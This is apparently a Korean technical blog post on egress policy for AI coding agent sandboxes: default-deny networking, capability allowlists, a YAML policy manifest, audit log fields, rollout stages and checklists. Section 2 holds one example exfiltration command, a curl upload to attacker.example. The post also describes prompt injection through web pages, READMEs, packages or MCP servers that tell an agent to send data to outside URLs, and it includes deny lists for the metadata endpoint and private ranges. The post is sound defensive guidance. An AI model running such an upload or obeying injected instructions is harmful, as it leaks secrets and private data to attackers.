---
title: "2026 개발 트렌드: Agent Sandbox Egress Policy, AI 코딩 에이전트의 네트워크 출구를 운영 자산으로 다루는 시대"
date: 2026-05-16
draft: false
tags: ["AI Agents", "Sandbox", "Egress Policy", "Developer Tools", "Security", "Platform Engineering"]
categories: ["Development", "AI", "Platform Engineering"]
series: "2026 개발 운영 트렌드"
keywords: ["AI agent sandbox", "egress policy", "coding agent security", "network sandbox", "agent governance"]
description: "AI 코딩 에이전트가 명령 실행과 웹 접근을 함께 수행하면서, 샌드박스의 핵심은 파일 격리뿐 아니라 네트워크 egress 정책으로 이동하고 있습니다. 팀이 어떤 기준으로 outbound 권한을 열고 감사해야 하는지 정리합니다."
lastmod: 2026-05-16
summary: "AI 코딩 에이전트의 위험은 코드 생성 품질만이 아니라 어디로 접속할 수 있는지에 달려 있습니다. Agent Sandbox Egress Policy는 에이전트 세션의 네트워크 출구를 default-deny, capability allowlist, 감사 로그, 예산 기반으로 운영하는 흐름입니다."
key_takeaways:
  - "에이전트 샌드박스는 파일시스템 격리만으로 부족하며, 네트워크 egress를 작업 단위 권한으로 관리해야 한다."
  - "패키지 설치, 문서 fetch, 내부 API 조회, 외부 전송은 서로 다른 risk class로 나누고 기본값은 deny가 안전하다."
  - "초기 도입은 egress broker, allowlist manifest, per-session budget, 감사 로그, 승인 기반 예외 처리부터 시작한다."
operator_checklist:
  - "에이전트 세션이 직접 인터넷, 사내망, metadata endpoint에 접근할 수 있는지 확인한다."
  - "npm/PyPI/GitHub 같은 개발 의존성 접근은 package proxy나 read-only mirror로 제한한다."
  - "외부 전송·권한 변경·프로덕션 API 호출은 승인 필요 action으로 분류한다."
decision_guide:
  title: "Agent Sandbox Egress Policy를 언제 도입할까"
  intro: "에이전트가 터미널, 브라우저, 패키지 매니저, 내부 API를 함께 쓰기 시작하면 egress 정책은 선택 사항이 아니라 운영 기본값이 됩니다."
  cases:
    - badge: "즉시 도입"
      title: "코딩 에이전트가 private repo, CI token, 내부 문서, 사내 API를 볼 수 있는 팀"
      fit: "네트워크 출구가 열려 있으면 prompt injection이나 악성 패키지가 민감정보를 외부로 보낼 수 있다."
      watchouts: "처음부터 모든 인터넷을 막으면 개발 흐름이 깨질 수 있으므로 package/document fetch부터 분리한다."
      next_step: "default-deny sandbox와 allowlist egress broker를 만든다."
    - badge: "부분 도입"
      title: "개인 개발 환경에서 에이전트를 쓰지만 아직 운영 자원에는 연결하지 않는 팀"
      fit: "위험은 낮지만 습관을 미리 잡을 수 있다."
      watchouts: "로컬의 SSH key, cloud credential, browser cookie가 샌드박스 밖에 남아 있을 수 있다."
      next_step: "비밀값 mount 금지와 package proxy부터 적용한다."
    - badge: "보류"
      title: "에이전트가 읽기 전용 코드 제안만 하고 네트워크·터미널 권한이 없는 환경"
      fit: "당장 복잡한 egress 계층은 과할 수 있다."
      watchouts: "권한이 생기는 순간 설계가 필요하므로 rollout gate에 포함해야 한다."
      next_step: "권한 확대 전에 policy manifest 양식만 준비한다."
learning_refs:
  - title: "SSRF와 Egress Control"
    href: "/learning/deep-dive/deep-dive-ssrf-egress-control-playbook/"
    description: "서버의 outbound 요청을 안전하게 여는 백엔드 기준입니다."
  - title: "Outside-the-Sandbox Harness"
    href: "/posts/2026-05-03-harness-outside-sandbox-agent-control-plane-trend/"
    description: "에이전트 두뇌와 작업장을 분리하는 운영 구조와 연결됩니다."
  - title: "Tool Permission Manifest"
    href: "/posts/2026-04-05-tool-permission-manifest-runtime-attestation-trend/"
    description: "도구 권한을 명시적으로 선언하고 검증하는 흐름입니다."
faqs:
  - question: "네트워크를 막으면 에이전트 생산성이 떨어지지 않나요?"
    answer: "처음에는 불편할 수 있습니다. 그래서 인터넷 전체 차단이 아니라 패키지 설치, 문서 조회, 내부 API, 외부 전송을 분리해 필요한 출구만 여는 방식이 현실적입니다."
  - question: "방화벽만 있으면 충분한가요?"
    answer: "방화벽은 출발점입니다. 작업 단위 owner, 허용 이유, 만료일, 감사 로그, 승인 흐름이 없으면 운영 중 예외가 계속 늘어납니다."
  - question: "개인 프로젝트에도 필요한가요?"
    answer: "private token이나 SSH key가 있는 환경에서 에이전트가 명령을 실행한다면 최소한 metadata endpoint, private CIDR, 임의 외부 POST는 막는 편이 안전합니다."
---

AI 코딩 에이전트 논의는 한동안 "얼마나 똑똑한가"에 집중했습니다. 더 긴 컨텍스트를 읽는가, 테스트를 고치는가, PR을 만들 수 있는가, 백그라운드에서 오래 일할 수 있는가가 주요 관심사였습니다. 그런데 에이전트가 실제 개발 환경으로 들어올수록 더 중요한 질문이 생깁니다. **이 에이전트는 어디로 접속할 수 있는가?**

코딩 에이전트는 이제 단순한 텍스트 생성기가 아닙니다. 터미널에서 패키지를 설치하고, 웹 문서를 가져오고, GitHub issue를 읽고, 내부 API를 호출하고, 때로는 브라우저를 조작합니다. 이 능력은 생산성을 올리지만 동시에 네트워크 출구를 공격 표면으로 만듭니다. 악성 패키지, prompt injection이 숨은 웹 페이지, 오염된 README, compromised MCP server가 에이전트에게 "이 내용을 외부 URL로 보내"라고 지시할 수 있습니다. 파일시스템 샌드박스가 있어도 네트워크가 열려 있으면 민감정보는 밖으로 나갈 수 있습니다.

그래서 최근 개발 플랫폼 관점에서 중요해지는 흐름이 **Agent Sandbox Egress Policy**입니다. 샌드박스는 더 이상 `/tmp` 작업 디렉터리와 컨테이너 격리만 뜻하지 않습니다. 어떤 목적의 네트워크 요청을 허용할지, 어떤 도메인은 package proxy를 통해서만 갈지, 내부망은 어떤 service broker로만 열지, 외부 write는 언제 승인할지까지 포함하는 운영 자산이 됩니다. 이 흐름은 [Outside-the-Sandbox Harness](/posts/2026-05-03-harness-outside-sandbox-agent-control-plane-trend/), [Agent Workspace Lease Broker](/posts/2026-05-11-agent-workspace-lease-broker-trend/), [Tool Permission Manifest](/posts/2026-04-05-tool-permission-manifest-runtime-attestation-trend/), 그리고 오늘 정리한 [SSRF와 Egress Control](/learning/deep-dive/deep-dive-ssrf-egress-control-playbook/)과 같은 방향을 봅니다. 에이전트의 자유도를 높일수록 출구는 더 좁고 명시적으로 관리해야 합니다.

## 이 글에서 얻는 것

- AI 코딩 에이전트에서 egress policy가 왜 파일 격리만큼 중요한지 이해할 수 있습니다.
- package install, web fetch, internal API, external write를 서로 다른 위험 등급으로 분리할 수 있습니다.
- default-deny sandbox, egress broker, allowlist manifest, session budget, 감사 로그를 어떤 순서로 도입할지 정할 수 있습니다.
- 생산성과 보안 사이의 현실적인 트레이드오프를 숫자와 조건으로 판단할 수 있습니다.

## 핵심 개념/이슈

### 1) 에이전트는 "코드를 쓰는 모델"이 아니라 "권한을 가진 컴퓨터 사용자"다

사람 개발자는 의심스러운 명령을 보면 멈출 수 있습니다. 에이전트는 더 빠르게 실행하고, 더 많은 파일을 읽고, 더 많은 URL을 열 수 있습니다. 특히 coding agent가 shell, package manager, browser, MCP tool을 함께 가진 순간 위험 모델이 달라집니다. 이때 에이전트는 IDE 플러그인이 아니라 제한된 권한의 작업자 identity로 봐야 합니다.

위험은 아래처럼 나눌 수 있습니다.

| 권한 | 생산성 이득 | 주요 위험 |
| --- | --- | --- |
| 코드 읽기 | 빠른 분석 | private logic 노출 |
| 파일 쓰기 | 패치 자동화 | 대량 변경, secret 삽입 |
| 패키지 설치 | 테스트 실행 | malicious dependency, postinstall script |
| 웹 fetch | 최신 문서 참조 | indirect prompt injection, data exfiltration |
| 내부 API 호출 | 운영 자동화 | 과권한, 프로덕션 변경 |
| 외부 전송 | 리포트/PR/메시지 | 민감정보 유출, 중복 전송 |

이 표에서 네트워크가 들어가는 순간부터 egress policy가 필요합니다. 에이전트가 어떤 instruction을 받았는지 완벽히 통제하기 어렵다면, 실행 가능한 네트워크 범위를 줄여야 합니다.

### 2) 샌드박스가 열려 있는 인터넷을 가진다면 반쪽짜리다

컨테이너를 쓰면 안전하다고 생각하기 쉽습니다. 하지만 컨테이너 안에서 `curl https://attacker.example/upload`가 가능하고, repo secret이나 로그가 읽힌다면 유출은 여전히 가능합니다. 심지어 외부 쓰기 권한이 없어도 DNS query, package registry request, image pull, telemetry endpoint를 통해 일부 정보가 새어 나갈 수 있습니다.

그래서 샌드박스 정책은 최소 네 계층으로 봐야 합니다.

1. 파일시스템: 어떤 경로를 read/write 할 수 있는가
2. 프로세스: 어떤 binary와 script를 실행할 수 있는가
3. 비밀값: 어떤 token, SSH key, cookie가 mount되는가
4. 네트워크: 어떤 destination, protocol, method로 나갈 수 있는가

많은 팀이 1~3번은 논의하지만 4번을 늦게 봅니다. 그러나 에이전트 사고에서 실제 피해는 네트워크를 통해 커지는 경우가 많습니다. 내부 정보가 외부로 나가거나, 외부에서 가져온 지시가 내부 작업에 영향을 주기 때문입니다.

### 3) Egress 권한은 목적별 capability로 나눠야 한다

"인터넷 허용"은 너무 넓습니다. 코딩 에이전트가 필요한 네트워크 작업은 대부분 몇 가지 capability로 분해할 수 있습니다.

| Capability | 예시 | 권장 기본값 |
| --- | --- | --- |
| Package read | npm, PyPI, Maven, container registry | proxy/mirror 경유, lockfile 우선 |
| Docs read | 공식 문서, GitHub README | GET만 허용, body size 제한 |
| Search/fetch | 웹 검색, issue reference | broker 경유, untrusted content 표시 |
| SCM read/write | GitHub issue/PR/comment | repo-scoped token, write는 승인 필요 |
| Internal read | observability, docs, feature flag 조회 | service broker 경유, read-only token |
| Internal write | 배포, 권한, 설정 변경 | 기본 deny, 명시 승인 |
| External write | Slack/Discord/email/webhook | 기본 deny, 사용자 확인 |

이렇게 나누면 예외를 설명할 수 있습니다. 예를 들어 "문서 fetch는 필요하지만 외부 POST는 필요 없다"는 정책이 가능해집니다. [Tool Contract Test](/posts/2026-04-30-tool-contract-test-agent-runtime-trend/)가 tool input/output 계약을 검증하듯, egress policy도 capability와 목적을 기준으로 검증해야 합니다.

### 4) Policy manifest는 샌드박스 실행 전 계약이다

좋은 에이전트 플랫폼은 작업 시작 전에 policy manifest를 생성하거나 선택합니다. 예를 들어 dependency update 작업과 production incident triage 작업은 필요한 네트워크가 다릅니다.

```yaml
job: dependency-update
risk: medium
network:
  default: deny
  allow:
    - capability: package_read
      destinations: ["registry.npmjs.org", "pypi.org", "repo.maven.apache.org"]
      methods: ["GET", "HEAD"]
      via: "package-proxy"
      max_bytes: "200MB"
    - capability: scm_write
      destinations: ["api.github.com"]
      methods: ["GET", "POST"]
      approval_required_for: ["merge_pr", "comment_external"]
  deny:
    - "169.254.169.254/32"
    - "10.0.0.0/8"
    - "172.16.0.0/12"
    - "192.168.0.0/16"
limits:
  total_egress_mb: 500
  unique_hosts: 20
  session_ttl_minutes: 120
```

핵심은 이 manifest가 장식 문서가 아니라 실제 네트워크 enforcement와 연결되어야 한다는 점입니다. 설정 파일에는 deny라고 쓰여 있는데 컨테이너가 직접 인터넷으로 나갈 수 있으면 의미가 없습니다.

### 5) 감사 로그는 "무엇을 요청했는가"보다 "왜 허용됐는가"를 남겨야 한다

에이전트의 네트워크 로그는 단순 access log보다 목적 정보가 필요합니다. 같은 `api.github.com` 요청도 issue 읽기인지 PR 생성인지, bot comment인지, release publish인지에 따라 위험이 다릅니다.

최소 로그 필드는 아래가 좋습니다.

```text
session_id, task_id, agent_id, policy_id,
capability, destination_host, resolved_ip,
method, bytes_out, bytes_in,
decision(allow|deny), reason,
approval_id(optional), tool_call_id(optional), trace_id
```

알림 기준도 숫자로 잡습니다.

- deny된 private CIDR 요청이 세션당 **3회 이상**이면 세션 격리 후 검토
- allowlist에 없는 unique host가 **10분에 10개 이상**이면 web fetch abuse 의심
- 외부 POST/PUT/PATCH/DELETE는 기본 deny, 예외는 approval_id 필수
- package registry 외부 다운로드가 lockfile 범위를 벗어나면 quarantine
- 세션 egress budget의 **80%**를 넘으면 사용자 확인 또는 작업 중단

이 기준은 보안팀만을 위한 것이 아닙니다. 나중에 에이전트가 왜 실패했는지, 어떤 문서를 읽었는지, 어떤 외부 호출이 변경으로 이어졌는지 개발팀이 이해하는 데도 필요합니다.

## 실무 적용

### 1) 첫 단계는 default-deny가 아니라 "관측 가능한 deny 후보" 만들기다

기존 개발 환경에 바로 default-deny를 걸면 테스트와 패키지 설치가 깨질 수 있습니다. 현실적인 시작은 observe mode입니다. 1~2주 동안 에이전트 세션의 outbound destination을 수집하고, 기능별로 분류합니다.

분류 기준은 아래처럼 단순해도 됩니다.

- package registry: npm, PyPI, Maven, Docker registry
- SCM: GitHub/GitLab API, git remote
- docs: 공식 문서, README, issue link
- search/fetch: 일반 웹
- internal: 사내 도메인, private CIDR, VPN-only host
- unknown: 위 분류에 없는 host

그다음 unknown과 internal을 우선 차단 후보로 둡니다. 2주 동안 실제로 필요한 host가 확인되면 owner와 만료일을 붙여 allowlist에 올립니다. 관측 없이 차단하면 불필요한 마찰이 크고, 관측만 하고 정책을 만들지 않으면 로그 쓰레기가 됩니다.

### 2) package install은 인터넷 직접 접근 대신 프록시로 보낸다

코딩 에이전트가 가장 자주 쓰는 네트워크는 패키지 설치입니다. `npm install`, `pip install`, `mvn test`, `go test`가 모두 외부 registry에 접근할 수 있습니다. 이 경로는 공급망 보안과 연결되므로 직접 인터넷보다 package proxy나 read-only mirror를 쓰는 편이 낫습니다.

초기 기준은 아래가 좋습니다.

- lockfile이 있으면 lockfile 범위 밖 major upgrade 금지
- postinstall script 실행은 기본 차단 또는 별도 승인
- registry는 공식 mirror/proxy만 허용
- 새 dependency 추가는 PR diff에 자동 표시
- known malicious package, typosquatting, maintainer change 신호는 quarantine
- 에이전트가 생성한 lockfile 변경은 사람이 review하기 전 merge 금지

이 흐름은 [Dependency Update Pipeline](/posts/2026-05-07-dependency-update-pipeline-trend/)과 [Package Release Quarantine Gate](/posts/2026-05-12-package-release-quarantine-gate-trend/)와 직접 연결됩니다. 에이전트가 dependency 작업을 빠르게 만들수록 quarantine과 review는 더 중요해집니다.

### 3) 웹 fetch는 읽기 전용 broker를 통하게 한다

에이전트가 공식 문서나 issue를 읽는 것은 유용합니다. 하지만 일반 웹 페이지는 prompt injection의 입력이기도 합니다. 그래서 웹 fetch는 broker를 통해 읽기 전용으로 제한합니다.

권장 정책은 아래입니다.

- method는 `GET`, `HEAD`만 허용
- request body는 금지
- cookie, Authorization header는 기본 제거
- private/link-local/metadata IP 차단
- redirect는 최대 2회, hop마다 재검증
- body 상한은 문서 2~5MB, PDF/첨부는 별도 승인
- 가져온 본문은 untrusted content로 표시하고 system instruction처럼 취급하지 않음

이 기준은 [LLM-readable Docs Surface](/posts/2026-05-10-llm-readable-docs-surface-trend/)에도 중요합니다. 문서를 에이전트가 읽기 쉽게 만드는 만큼, 그 문서가 에이전트에게 지시할 수 있는 것처럼 오해하지 않게 경계를 둬야 합니다.

### 4) 내부 API는 직접 열지 말고 service broker로 추상화한다

가장 위험한 패턴은 에이전트 샌드박스가 VPN 안에서 내부 API 전체를 볼 수 있는 구조입니다. 이 경우 prompt injection 하나가 staging admin API, feature flag, observability, 배포 시스템으로 이어질 수 있습니다.

대신 내부 API는 broker tool로 노출합니다.

```text
Agent Sandbox → approved tool call → Service Broker → Internal API
```

broker는 action을 read-only, proposal, approval-required write로 나눕니다. 예를 들어 로그 조회는 read-only, rollback plan 생성은 proposal, 실제 rollback은 approval-required write입니다. 이 구분은 [MCP Apps](/posts/2026-05-15-mcp-apps-conversation-native-ui-trend/)에서 다룬 action risk와도 같습니다. 네트워크를 직접 열기보다 의미 있는 도구로 감싸면 권한과 감사가 쉬워집니다.

### 5) rollout은 세 단계로 가져간다

바로 완벽한 egress control을 만들려고 하면 느려집니다. 추천 rollout은 아래입니다.

1. **Observe**: 모든 outbound를 로그로 수집하고 private/unknown 요청을 표시한다. 기간은 1~2주.
2. **Soft deny**: private CIDR, metadata endpoint, 외부 write를 차단하되 override 요청을 받을 수 있게 한다. 기간은 2~4주.
3. **Default deny**: capability allowlist에 없는 destination은 막고, policy manifest 없는 세션은 네트워크를 열지 않는다.

성공 기준도 정합니다.

- 정상 작업 실패율이 5% 이하로 유지된다.
- unknown host 비율이 2주 연속 전체 outbound의 5% 이하가 된다.
- private/metadata deny 이벤트가 0 또는 설명 가능한 테스트로만 남는다.
- policy exception의 90% 이상에 owner와 expires_at이 있다.
- 외부 write action은 100% approval_id를 가진다.

이 정도 숫자가 있어야 보안 정책이 감이 아니라 운영 품질로 관리됩니다.

## 실패 모드별 대응 매트릭스

Egress policy는 차단 규칙 목록으로만 운영하면 오래가지 못합니다. 실제 운영에서는 "왜 막혔는지", "누가 예외를 열 수 있는지", "예외가 끝난 뒤 무엇을 지울지"가 같이 있어야 합니다. 아래처럼 실패 모드를 미리 나눠두면 보안팀과 플랫폼팀, 개발팀이 같은 언어로 대화하기 쉬워집니다.

| 실패 모드 | 흔한 원인 | 즉시 대응 | 재발 방지 |
| --- | --- | --- | --- |
| 공식 문서 fetch 실패 | allowlist 누락, redirect host 미등록 | broker 로그에서 최종 host와 redirect chain 확인 후 read-only 예외 검토 | docs_read capability에 owner와 expires_at 추가 |
| 패키지 설치 실패 | lockfile 밖 dependency, postinstall script, registry mirror 미동기화 | proxy cache 상태와 lockfile diff 확인 | dependency update pipeline에 quarantine reason 노출 |
| 내부 API 접근 차단 | 에이전트가 직접 사내망 endpoint를 호출 | 직접 접근은 유지 차단, 필요한 조회만 service broker action으로 설계 | internal_read와 internal_write action을 분리 |
| 외부 POST 차단 | 리포트 전송, webhook 호출, 악성 지시 가능성 | 본문에 secret 포함 여부 확인 후 사용자 승인 필요 | external_write는 approval_id와 redaction 로그 필수화 |
| unknown host 급증 | 검색 결과 무차별 fetch, 패키지 transitive download, prompt injection | 세션 일시 중단 후 top host와 bytes_out 확인 | unique host budget과 domain category 정책 강화 |
| metadata endpoint 접근 | cloud SDK 기본 credential discovery, 악성 스크립트 | 즉시 차단 유지, credential mount 여부 확인 | 169.254.169.254/32와 provider metadata host를 base deny에 고정 |

이 매트릭스의 핵심은 차단을 "실패"로만 보지 않는 것입니다. 차단 이벤트는 정책이 실제로 작동했다는 신호이기도 합니다. 다만 같은 유형의 차단이 반복되면 개발자가 우회하기 시작하므로, 반복 이벤트는 둘 중 하나로 결론을 내야 합니다. 정말 필요한 작업이면 좁은 capability로 승격하고, 불필요하거나 위험한 작업이면 deny reason을 더 명확하게 보여줍니다.

예외 처리도 숫자로 관리하는 편이 좋습니다. 예를 들어 `docs_read` 예외는 30일, `package_read` 예외는 lockfile 갱신 주기까지, `internal_read` 예외는 incident 종료 시점까지, `external_write` 예외는 단일 실행으로 제한합니다. 만료 없는 예외는 시간이 지나면 사실상 기본 허용이 됩니다. 따라서 예외 목록에는 최소한 `owner`, `reason`, `created_at`, `expires_at`, `last_used_at`, `linked_task`가 있어야 합니다.

운영 대시보드도 화려할 필요는 없습니다. 첫 버전은 아래 5개만 보여줘도 충분합니다.

- 세션별 allow/deny 비율과 deny top reason
- capability별 bytes_out, bytes_in, unique host 수
- private CIDR·metadata endpoint 접근 시도 수
- approval_id 없는 external write 시도 수
- 만료 예정 또는 만료 지난 policy exception 수

이 지표가 있으면 "보안 때문에 느려졌다"와 "안전하게 필요한 만큼만 열었다"를 구분할 수 있습니다. 특히 에이전트 운영은 실패가 조용히 묻히면 다음에는 더 넓은 권한으로 재시도되는 경향이 있습니다. 그래서 차단 이벤트를 개발자 경험 안에 잘 설명하고, 필요한 예외 신청 경로를 짧게 만드는 것이 장기적으로 더 안전합니다.

## 트레이드오프/주의점

### 1) 너무 빨리 막으면 에이전트가 쓸모없어진다

개발 작업은 예외가 많습니다. 새 문서를 읽어야 하고, 새 패키지를 받아야 하고, CI 로그 링크를 따라가야 합니다. 모든 것을 deny하면 사용자는 결국 샌드박스를 우회하거나 더 넓은 권한의 로컬 환경으로 돌아갑니다. 그래서 처음에는 high-risk destination부터 막는 편이 낫습니다. metadata endpoint, private CIDR, 외부 POST, credential 포함 request는 즉시 차단하고, read-only docs fetch는 관측 후 제한합니다.

### 2) 너무 넓게 열면 샌드박스의 의미가 사라진다

반대로 `*.github.com`, `*.amazonaws.com`, `*` 같은 wildcard가 늘어나면 policy는 금방 무력화됩니다. wildcard는 owner, reason, expiry, last_seen을 요구하고 30~90일마다 재승인하는 편이 좋습니다. 특히 cloud storage wildcard는 데이터 유출 경로가 될 수 있으므로 read-only와 write를 분리해야 합니다.

### 3) BYOC나 사내 실행 환경은 책임도 같이 가져온다

에이전트를 조직의 VPC 안에서 실행하면 데이터 경계는 좋아질 수 있습니다. 하지만 그만큼 내부망 접근 위험도 커집니다. "우리 클라우드 안에서 도니까 안전하다"가 아니라, 우리 클라우드의 security group, route table, NAT, DNS, IAM 정책을 에이전트용으로 다시 설계해야 합니다. BYOC는 통제권을 주지만 기본값을 자동으로 안전하게 만들지는 않습니다.

### 4) 프롬프트 방어와 네트워크 방어를 혼동하지 않는다

prompt injection 탐지는 필요하지만 완전한 방어가 아닙니다. 모델이 악성 지시를 무시하길 기대하는 것보다, 설령 지시를 따르려 해도 네트워크가 막혀 있도록 만드는 편이 안전합니다. 좋은 구조는 "모델이 실수해도 egress policy가 막고, policy가 막은 이벤트를 감사 로그가 설명하는" 형태입니다.

## 체크리스트 또는 연습

### 운영 체크리스트

- [ ] 에이전트 세션의 outbound destination을 1~2주 관측했다.
- [ ] private CIDR, loopback, link-local, metadata endpoint는 기본 차단한다.
- [ ] package install은 proxy/mirror를 통해서만 허용한다.
- [ ] web fetch는 GET/HEAD만 허용하고 cookie/Authorization header를 제거한다.
- [ ] 내부 API는 직접 네트워크 접근이 아니라 service broker/tool을 통해 호출한다.
- [ ] 외부 POST/PUT/PATCH/DELETE는 approval_id 없이는 실패한다.
- [ ] policy manifest에는 owner, risk, capability, destination, method, expires_at이 있다.
- [ ] 세션별 egress byte budget과 unique host budget을 둔다.
- [ ] deny 이벤트는 session_id, policy_id, reason, trace_id로 추적 가능하다.
- [ ] policy 예외는 30~90일마다 재검토된다.

### 연습 문제

다음 상황을 가정해보세요.

> 팀이 백그라운드 코딩 에이전트에게 dependency update PR 생성을 맡기려 한다. 에이전트는 private repo를 읽고, 테스트를 실행하고, 필요한 패키지를 설치하고, PR을 열 수 있어야 한다. 운영 API나 사내 관리자 페이지에는 접근하면 안 된다.

권장 정책은 아래처럼 설계할 수 있습니다.

1. repo checkout과 작업 디렉터리 write는 허용하되, SSH key와 cloud credential은 mount하지 않는다.
2. npm/PyPI/Maven 접근은 package proxy로만 허용한다.
3. GitHub API는 해당 repo의 issue/branch/PR scope만 허용한다.
4. 외부 웹 fetch는 공식 docs allowlist 또는 broker GET으로만 허용한다.
5. private CIDR, metadata endpoint, 사내 admin domain은 네트워크 레벨에서 deny한다.
6. PR 생성은 허용하되 merge, release publish, 외부 메시지 전송은 승인 필요 action으로 둔다.
7. 세션 egress budget은 500MB, unique host는 20개, TTL은 2시간으로 시작한다.
8. lockfile 외 dependency 추가, postinstall script 실행, unknown binary download는 quarantine한다.

이 설계의 목적은 에이전트를 무력화하는 것이 아닙니다. 필요한 개발 작업은 하게 하되, 작업 범위를 벗어난 네트워크 행동이 사고로 이어지지 않게 만드는 것입니다. 앞으로 코딩 에이전트가 더 강해질수록 경쟁력은 "얼마나 많이 시키는가"보다 **얼마나 좁은 권한으로 안전하게 시키는가**에서 갈릴 가능성이 큽니다.
